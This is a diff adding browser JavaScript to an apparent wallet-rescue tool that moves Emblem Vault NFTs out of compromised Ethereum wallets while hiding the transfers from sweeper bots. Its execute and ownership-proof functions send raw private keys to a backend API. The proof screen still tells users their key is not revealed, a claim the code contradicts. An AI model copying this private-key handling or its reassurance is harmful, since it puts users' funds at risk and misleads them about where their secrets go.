+    const badgeColor = isLegacy ? 'var(--warn)' : 'var(--accent2)';
+    const badgeText = isLegacy ? 'Legacy' : 'V2';
+    const imgSrc = v.image ? esc(v.image.replace('ipfs://', 'https://ipfs.io/ipfs/')) : '';
+    const assets = v.containedAssets ? esc(v.containedAssets) : '<span style="color:var(--text3);">No contents detected</span>';
+
+    html += `<div class="dash-row" style="align-items:center;gap:10px;padding:10px 12px;">
+      <input type="checkbox" ${checked} onchange="toggleEmblemVault(${i})" style="accent-color:var(--accent2);width:16px;height:16px;flex-shrink:0;" />
+      ${imgSrc ? `<img src="${imgSrc}" style="width:32px;height:32px;border-radius:2px;object-fit:cover;flex-shrink:0;" onerror="this.style.display='none'" />` : ''}
+      <div style="flex:1;min-width:0;">
+        <div style="font-size:0.65rem;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${esc(v.name)}</div>
+        <div style="font-size:0.55rem;color:var(--accent2);margin-top:2px;">${assets}</div>
+      </div>
+      <span class="badge-sm" style="background:${badgeColor};color:#000;flex-shrink:0;">${badgeText}</span>
+    </div>`;
+  });
+
+  container.innerHTML = html;
+  checkEmblemExecReady();
+}
+
+function toggleEmblemVault(idx) {
+  if (emblemSelected.has(idx)) {
+    emblemSelected.delete(idx);
+  } else {
+    emblemSelected.add(idx);
+  }
+  checkEmblemExecReady();
+}
+
+function confirmEmblemRescue() {
+  const count = emblemSelected.size;
+  const dest = document.getElementById('emblemDest').value.trim();
+  const from = document.getElementById('emblemWallet').value.trim();
+  showModal('▶', 'Execute Emblem Vault Rescue',
+    `<strong>Summary:</strong>\n• ${count} Emblem Vault${count !== 1 ? 's' : ''} on Ethereum\n• From: ${shortAddr(from)}\n• To: ${shortAddr(dest)}\n• MEV Blocker: ON (hidden from sweeper bot)\n\nThis will fund your compromised wallet and transfer all selected vaults privately.`,
+    [{label:'Cancel',cls:'btn-ghost',fn:closeModal},{label:'▶ Execute',cls:'btn-green',fn:()=>{closeModal();executeEmblemRescue();}}]
+  );
+}
+
+async function executeEmblemRescue() {
+  const compromisedKey = document.getElementById('emblemCompromisedKey').value.trim();
+  const fundingKey = document.getElementById('emblemFundingKey').value.trim();
+  const toAddress = document.getElementById('emblemDest').value.trim();
+  const alchemyKey = document.getElementById('emblemAlchemyKey').value.trim() || STATE.alchemyKey;
+
+  const selectedVaults = [];
+  emblemSelected.forEach(idx => {
+    const v = emblemVaults[idx];
+    if (v) selectedVaults.push({ contract: v.contract, tokenId: v.tokenId });
+  });
+
+  if (selectedVaults.length === 0) return;
+
+  document.getElementById('emblemExecBtn').disabled = true;
+  document.getElementById('emblemExecBtn').textContent = 'Executing...';
+  const logEl = document.getElementById('emblemExecLog');
+  logEl.innerHTML = '';
+  logEl.style.display = 'block';
+
+  function emblemLog(msg, type) {
+    const line = document.createElement('div');
+    line.className = 'log-line';
+    const typeClass = type === 'error' ? 'log-error' : type === 'ok' ? 'log-ok' : type === 'info' ? 'log-info' : 'log-dim';
+    line.innerHTML = `<span class="log-ts">${ts()}</span><span class="${typeClass}">${esc(msg)}</span>`;
+    logEl.appendChild(line);
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  emblemLog('Starting Emblem Vault rescue...', 'info');
+
+  try {
+    const res = await fetch(API + '/api/emblem/execute', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        vaultTokenIds: selectedVaults,
+        compromisedKey,
+        fundingKey,
+        toAddress,
+        alchemyKey
+      })
+    });
+    const result = await res.json();
+
+    if (result.success) {
+      for (const p of result.data.progressLog || []) {
+        const type = p.error ? 'error' : (p.step === 'complete' ? 'ok' : 'info');
+        let txLink = '';
+        if (p.txHash) {
+          txLink = ` <a href="https://etherscan.io/tx/${esc(p.txHash)}" target="_blank" style="color:var(--accent3);">[view]</a>`;
+        }
+        const line = document.createElement('div');
+        line.className = 'log-line';
+        const typeClass = type === 'error' ? 'log-error' : type === 'ok' ? 'log-ok' : 'log-info';
+        line.innerHTML = `<span class="log-ts">${ts()}</span><span class="${typeClass}">${esc(p.message)}${txLink}</span>`;
+        logEl.appendChild(line);
+        logEl.scrollTop = logEl.scrollHeight;
+      }
+
+      if (result.data.status === 'complete') {
+        showSuccessModal(result.data.confirmed, toAddress);
+      }
+    } else {
+      emblemLog('✗ ' + (result.error || 'Execution failed'), 'error');
+    }
+  } catch(e) {
+    emblemLog('✗ ' + e.message, 'error');
+  }
+
+  document.getElementById('emblemExecBtn').disabled = false;
+  document.getElementById('emblemExecBtn').textContent = '▶ Execute Emblem Rescue';
+}
+
+// ── Vault Inspector ──
+function setInspectContract(which) {
+  const v2btn = document.getElementById('inspectV2Btn');
+  const legBtn = document.getElementById('inspectLegacyBtn');
+  if (which === 'v2') {
+    document.getElementById('emblemInspectContract').value = EMBLEM_V2;
+    v2btn.classList.add('active');
+    legBtn.classList.remove('active');
+  } else {
+    document.getElementById('emblemInspectContract').value = EMBLEM_LEGACY;
+    legBtn.classList.add('active');
+    v2btn.classList.remove('active');
+  }
+}
+
+async function inspectVault() {
+  const tokenId = document.getElementById('emblemInspectTokenId').value.trim();
+  const contract = document.getElementById('emblemInspectContract').value;
+  const alchemyKey = document.getElementById('emblemInspectAlchemyKey').value.trim()
+    || document.getElementById('emblemAlchemyKey').value.trim()
+    || STATE.alchemyKey;
+
+  if (!tokenId) {
+    showModal('⚠', 'Token ID Required', 'Enter the token ID to inspect.', [{label:'OK',cls:'btn-ghost',fn:closeModal}]);
+    return;
+  }
+  if (!alchemyKey) {
+    showModal('⚠', 'Alchemy Key Required', 'Enter your Alchemy API key.', [{label:'OK',cls:'btn-ghost',fn:closeModal}]);
+    return;
+  }
+
+  const resultEl = document.getElementById('emblemInspectResult');
+  resultEl.style.display = 'block';
+  resultEl.innerHTML = '<div style="padding:12px;text-align:center;color:var(--text3);font-size:0.6rem;">Inspecting vault...</div>';
+
+  try {
+    const url = `https://eth-mainnet.g.alchemy.com/nft/v3/${alchemyKey}/getNFTMetadata?contractAddress=${contract}&tokenId=${tokenId}&refreshCache=false`;
+    const response = await fetch(url);
+    if (!response.ok) throw new Error(`Alchemy returned HTTP ${response.status}`);
+    const nft = await response.json();
+
+    const name = nft.name || nft.raw?.metadata?.name || `Vault #${tokenId}`;
+    const description = nft.description || nft.raw?.metadata?.description || '';
+    const image = nft.image?.cachedUrl || nft.image?.originalUrl || nft.raw?.metadata?.image || '';
+    const imgSrc = image.replace('ipfs://', 'https://ipfs.io/ipfs/');
+    const metadata = nft.raw?.metadata || {};
+    const containedAssets = (metadata.attributes || []).find(a => a.trait_type === 'Contained Assets');
+    const assets = containedAssets ? containedAssets.value : 'No contained assets detected';
+    const isLegacy = contract.toLowerCase() === EMBLEM_LEGACY.toLowerCase();
+
+    resultEl.innerHTML = `
+      <div style="text-align:center;margin-bottom:12px;">
+        ${imgSrc ? `<img src="${esc(imgSrc)}" style="max-width:200px;border-radius:2px;border:1px solid var(--border);" onerror="this.style.display='none'" />` : ''}
+      </div>
+      <div style="font-size:0.7rem;font-weight:600;color:var(--text);margin-bottom:4px;">${esc(name)}</div>
+      <div style="font-size:0.55rem;color:var(--text2);margin-bottom:8px;">${esc(description)}</div>
+      <div style="background:var(--s2);border:1px solid var(--border);border-radius:2px;padding:10px 12px;margin-bottom:8px;">
+        <div style="font-size:0.5rem;color:var(--text3);text-transform:uppercase;letter-spacing:0.08em;margin-bottom:4px;">Contained Assets</div>
+        <div style="font-size:0.65rem;color:var(--accent2);font-family:var(--mono);">${esc(assets)}</div>
+      </div>
+      <div style="font-size:0.5rem;color:var(--text3);margin-bottom:4px;">
+        Contract: <span style="color:${isLegacy ? 'var(--warn)' : 'var(--accent2)'};">${isLegacy ? 'Legacy' : 'V2'}</span> · Token ID: ${esc(tokenId)}
+      </div>
+      <details style="margin-top:8px;">
+        <summary style="font-size:0.5rem;color:var(--text3);cursor:pointer;">Raw Metadata</summary>
+        <pre class="exec-log" style="display:block;max-height:200px;overflow:auto;margin-top:6px;font-size:0.5rem;white-space:pre-wrap;word-break:break-all;">${esc(JSON.stringify(metadata, null, 2))}</pre>
+      </details>
+    `;
+  } catch(e) {
+    resultEl.innerHTML = `<div style="padding:12px;color:var(--danger);font-size:0.6rem;">✗ ${esc(e.message)}</div>`;
+  }
+}
+
+// ── Ownership Proof ──
+function setProofContract(which) {
+  const v2btn = document.getElementById('proofV2Btn');
+  const legBtn = document.getElementById('proofLegacyBtn');
+  if (which === 'v2') {
+    document.getElementById('emblemProofContract').value = EMBLEM_V2;
+    v2btn.classList.add('active');
+    legBtn.classList.remove('active');
+  } else {
+    document.getElementById('emblemProofContract').value = EMBLEM_LEGACY;
+    legBtn.classList.add('active');
+    v2btn.classList.remove('active');
+  }
+}
+
+async function generateEmblemProof() {
+  const tokenId = document.getElementById('emblemProofTokenId').value.trim();
+  const contract = document.getElementById('emblemProofContract').value;
+  const privateKey = document.getElementById('emblemProofKey').value.trim();
+
+  if (!tokenId || !privateKey) {
+    showModal('⚠', 'Missing Fields', 'Token ID and private key are both required.', [{label:'OK',cls:'btn-ghost',fn:closeModal}]);
+    return;
+  }
+
+  const resultEl = document.getElementById('emblemProofResult');
+  resultEl.style.display = 'block';
+  resultEl.innerHTML = '<div style="padding:12px;text-align:center;color:var(--text3);font-size:0.6rem;">Generating signature...</div>';
+
+  try {
+    const res = await fetch(API + '/api/emblem/proof', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ tokenId, contractAddress: contract, privateKey })
+    });
+    const result = await res.json();
+    if (!result.success) throw new Error(result.error || 'Proof generation failed');
+
+    const d = result.data;
+    resultEl.innerHTML = `
+      <div style="background:var(--s2);border:1px solid var(--border);border-radius:2px;padding:12px;">
+        <div style="margin-bottom:10px;">
+          <div style="font-size:0.5rem;color:var(--text3);text-transform:uppercase;letter-spacing:0.08em;">Signer Address</div>
+          <div style="font-size:0.6rem;color:var(--text);font-family:var(--mono);word-break:break-all;">${esc(d.signerAddress)}</div>
+        </div>
+        <div style="margin-bottom:10px;">
+          <div style="font-size:0.5rem;color:var(--text3);text-transform:uppercase;letter-spacing:0.08em;">Signed Message</div>
+          <div style="font-size:0.55rem;color:var(--text2);font-family:var(--mono);word-break:break-all;">${esc(d.message)}</div>
+        </div>
+        <div style="margin-bottom:10px;">
+          <div style="font-size:0.5rem;color:var(--text3);text-transform:uppercase;letter-spacing:0.08em;">Signature</div>
+          <div style="font-size:0.5rem;color:var(--accent2);font-family:var(--mono);word-break:break-all;user-select:all;padding:8px;background:var(--s1);border:1px solid var(--border);border-radius:2px;margin-top:4px;" id="emblemSigText">${esc(d.signature)}</div>
+        </div>
+        <button class="btn btn-ghost" id="copyEmblemProofBtn" onclick="copyEmblemProof()" style="width:100%;margin-top:4px;">Copy Signature</button>
+        <div style="margin-top:10px;padding:10px;background:var(--s3);border-radius:2px;font-size:0.5rem;color:var(--text2);line-height:1.6;">
+          <strong style="color:var(--accent);">How to use this:</strong><br />
+          Submit this signature to Emblem Vault support (Discord or X @EmblemVault) to prove ownership without revealing your private key. Include the signer address, message, and signature above.
+        </div>
+      </div>
+    `;
+  } catch(e) {
+    resultEl.innerHTML = `<div style="padding:12px;color:var(--danger);font-size:0.6rem;">✗ ${esc(e.message)}</div>`;
+  }
+}
+
+function copyEmblemProof() {
+  const sig = document.getElementById('emblemSigText').textContent.trim();
+  navigator.clipboard.writeText(sig).then(() => {
+    const btn = document.getElementById('copyEmblemProofBtn');
+    const orig = btn.textContent;
+    btn.textContent = 'Copied ✓';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = orig; btn.classList.remove('copied'); }, 2000);
+  }).catch(() => {
+    const btn = document.getElementById('copyEmblemProofBtn');
+    btn.textContent = 'Select & copy manually';
+    setTimeout(() => { btn.textContent = 'Copy Signature'; }, 2500);
+  });
+}
+
+// Auto-fill Alchemy key when switching to Emblem tab
+(function() {
+  const emblemKeyEl = document.getElementById('emblemAlchemyKey');
+  if (emblemKeyEl && !emblemKeyEl.value && STATE.alchemyKey) {
+    emblemKeyEl.value = STATE.alchemyKey;
+  }
+})();
+</script>
+
+</body>
+</html>
